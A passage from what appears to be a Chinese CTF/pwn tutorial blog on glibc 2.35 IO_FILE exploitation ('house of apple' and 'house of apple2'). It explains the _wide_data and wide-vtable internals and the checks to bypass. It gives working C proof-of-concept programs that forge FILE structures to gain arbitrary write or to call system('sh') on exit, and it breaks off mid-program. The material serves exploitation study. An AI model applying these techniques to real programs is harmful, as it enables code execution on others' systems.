class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure></div>

<p>因此控制了 <code>_wide_data</code> 指针就能完成任意地址写。</p>
<p><strong>需要绕过的点</strong></p>
<ul>
<li>为了能够进入 <code>_IO_wstrn_overflow</code> 函数的 <code>if</code> 判断中，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 。</li>
<li>为了避免执行 <code>free (f-&gt;_wide_data-&gt;_IO_buf_base);</code> 需要满足 <code>f-&gt;_wide_data-&gt;_IO_buf_base</code> 为空或者 <code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code> 不为 0 ，其中 <code>_IO_FLAGS2_USER_WBUF</code> 为 <code>8</code> 。</li>
<li>另外如果利用 <code>FSOP</code> 触发需要满足：   <ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
</li>
</ul>
<h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>自行修改偏移。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编译环境 libc6_2.35-0ubuntu3.1_amd64.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base + <span class="number">0x215A00</span> + <span class="number">0x3c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    <span class="built_in">fcloseall</span>();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231210140206622.png"
                      alt="image-20231210140206622"
                ></p>
<h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a><a class="link"   href="https://bbs.kanxue.com/thread-273832.htm" >house of apple2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p>这里把<code>roderick</code>师傅写的几个利用方式都写了一个 <code>POC</code>。</p>
<p><strong>前置条件</strong></p>
<ul>
<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>
</ul>
<h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p><code>struct _IO_wide_data</code>结构体有一个<code>  const struct _IO_jump_t *_wide_vtable</code>成员。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable; <span class="comment">// 偏移0xe0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>而我们的<code>_IO_WOVERFLOW</code> 没有 <code>IO_validate_vtable</code> 检查。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div>

<p>因此，我们可以劫持 <code>IO_FILE_plus</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>
<h2 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用<code>_IO_wfile_overflow</code>函数控制程序执行流</h2><h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wfile_overflow-&gt; _IO_wdoallocbuf-&gt; _IO_WDOALLOCATE-&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">            <span class="comment">/* 这里调用了 _IO_wdoallocbuf () 函数 */</span></span><br><span class="line">	  		_IO_wdoallocbuf (f);</span><br><span class="line">	  		_IO_free_wbackup_area (f);</span><br><span class="line">	  		_IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                       f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">			[...]</span><br><span class="line">		&#125;</span><br><span class="line">		[...]</span><br><span class="line">    &#125;</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">        <span class="comment">/*满足条件则会调用 _IO_WDOALLOCATE*/</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE(fp) != WEOF)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure></div>

<p>这里会去调用 <code>FP-&gt;doallocate</code>，也就是我们 <code>struct _IO_jump_t</code> 偏移 <code>0x68</code> 的位置，我们可以将其截获为 <code>one_gadget</code>。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x2160C0</span>; <span class="comment">// vtable, 0x215F40, 0x216000</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x18</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用<code>_IO_wfile_underflow_mmap</code>函数控制程序执行流</h2><h3 id="相关配置-1"><a href="#相关配置-1" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="函数调用链-1"><a href="#函数调用链-1" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wfile_underflow_mmap-&gt; _IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这里有一个 bug? 直接搜和点击 _IO_wfile_underflow_mmap 都无法搜索到相关内容 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *cd;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_1 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">      <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_2 */</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_3 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">          <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="comment">/* 需要调用到这里 */</span></span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">  &#125;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 需要绕过的点 if_4 */</span></span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">/* 需要绕过的点 if_5 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">        <span class="comment">/*满足条件则会调用 _IO_WDOALLOCATE*/</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE(fp) != WEOF)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure></div>

<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span 